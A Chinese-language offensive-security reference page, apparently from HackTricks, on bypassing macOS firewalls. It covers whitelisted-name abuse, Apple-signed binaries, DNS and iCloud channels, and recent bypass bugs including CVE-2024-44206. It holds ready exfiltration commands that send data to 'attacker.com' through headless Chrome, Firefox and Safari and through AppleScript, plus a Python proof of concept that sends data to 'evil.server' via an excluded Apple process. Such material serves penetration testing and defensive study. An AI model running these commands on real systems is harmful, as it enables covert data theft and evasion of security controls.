# macOS 绕过防火墙

{{#include ../../banners/hacktricks-training.md}}

## 发现的技术

以下技术在某些 macOS 防火墙应用中有效。

### 滥用白名单名称

- 例如，使用知名 macOS 进程的名称调用恶意软件，如 **`launchd`**

### 合成点击

- 如果防火墙要求用户授权，让恶意软件 **点击允许**

### **使用苹果签名的二进制文件**

- 像 **`curl`**，还有其他如 **`whois`**

### 知名苹果域名

防火墙可能允许连接到知名的苹果域名，如 **`apple.com`** 或 **`icloud.com`**。iCloud 可以用作 C2。

### 通用绕过

一些尝试绕过防火墙的想法

### 检查允许的流量

了解允许的流量将帮助您识别潜在的白名单域名或哪些应用程序被允许访问它们。
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### 滥用 DNS

DNS 解析是通过 **`mdnsreponder`** 签名应用程序完成的，该应用程序可能被允许联系 DNS 服务器。

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### 通过浏览器应用

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- 谷歌浏览器
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- 火狐浏览器
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### 通过进程注入

如果你可以**将代码注入到一个可以连接到任何服务器的进程中**，你就可以绕过防火墙保护：

{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## 最近的 macOS 防火墙绕过漏洞 (2023-2025)

### 网络内容过滤器（屏幕时间）绕过 – **CVE-2024-44206**
在2024年7月，苹果修复了Safari/WebKit中的一个关键漏洞，该漏洞破坏了屏幕时间家长控制使用的系统范围“网络内容过滤器”。
一个特别构造的URI（例如，带有双重URL编码的“://”）未被屏幕时间ACL识别，但被WebKit接受，因此请求未经过滤地发送出去。任何可以打开URL的进程（包括沙盒或未签名的代码）因此可以访问用户或MDM配置文件明确阻止的域。

实际测试（未修补的系统）：
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Packet Filter (PF) 规则排序漏洞在早期 macOS 14 “Sonoma”
在 macOS 14 测试版周期中，Apple 在 **`pfctl`** 的用户空间包装中引入了一个回归。
使用 `quick` 关键字添加的规则（许多 VPN 杀开关使用）被静默忽略，即使 VPN/防火墙 GUI 报告 *已阻止*，也会导致流量泄漏。该漏洞已被多个 VPN 供应商确认，并在 RC 2（构建 23A344）中修复。

快速泄漏检查：
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### 滥用苹果签名的辅助服务（遗留 – macOS 11.2 之前）
在 macOS 11.2 之前，**`ContentFilterExclusionList`** 允许 ~50 个苹果二进制文件，如 **`nsurlsessiond`** 和 App Store，绕过所有使用网络扩展框架（LuLu、Little Snitch 等）实现的套接字过滤防火墙。
恶意软件可以简单地生成一个被排除的进程——或向其中注入代码——并通过已经允许的套接字隧道其自身流量。苹果在 macOS 11.2 中完全移除了排除列表，但该技术在无法升级的系统上仍然相关。

示例概念验证（11.2 之前）：
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
---

## Tooling tips for modern macOS

1. 检查 GUI 防火墙生成的当前 PF 规则：
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. 枚举已经拥有 *outgoing-network* 权限的二进制文件（对搭便车很有用）：
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. 以编程方式在 Objective-C/Swift 中注册您自己的网络扩展内容过滤器。
一个最小的无根 PoC，可以将数据包转发到本地套接字，已在 Patrick Wardle 的 **LuLu** 源代码中提供。

## References

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>

{{#include ../../banners/hacktricks-training.md}}
